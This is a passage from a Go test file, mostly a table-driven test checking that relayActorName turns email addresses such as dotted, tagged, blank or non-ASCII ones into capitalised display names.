			if actor.ConnectionID != connection.id {
				t.Fatalf("actor connection = %q, want %q", actor.ConnectionID, connection.id)
			}
		})
	}
}

func TestRelayActorName(t *testing.T) {
	t.Parallel()
	for _, test := range []struct {
		name  string
		email string
		want  string
	}{
		{name: "dotted local part", email: "ada.lovelace@example.test", want: "Ada Lovelace"},
		{name: "underscores and dashes", email: "grace_brewster-murray@example.test", want: "Grace Brewster Murray"},
		{name: "single word", email: "ada@example.test", want: "Ada"},
		{name: "already capitalised", email: "Ada.Lovelace@example.test", want: "Ada Lovelace"},
		{name: "routing tag", email: "ada.lovelace+detent@example.test", want: "Ada Lovelace"},
		{name: "surrounding space", email: "  ada@example.test  ", want: "Ada"},
		{name: "no domain", email: "ada.lovelace", want: "Ada Lovelace"},
		{name: "separators only", email: "...@example.test", want: "...@example.test"},
		{name: "non-ascii", email: "ada.ñ@example.test", want: "Ada Ñ"},
		{name: "empty", email: "", want: ""},
		{name: "blank", email: "   ", want: ""},
	} {
		t.Run(test.name, func(t *testing.T) {
			t.Parallel()
			if got := relayActorName(test.email); got != test.want {
				t.Fatalf("relayActorName(%q) = %q, want %q", test.email, got, test.want)
			}
		})
	}
}
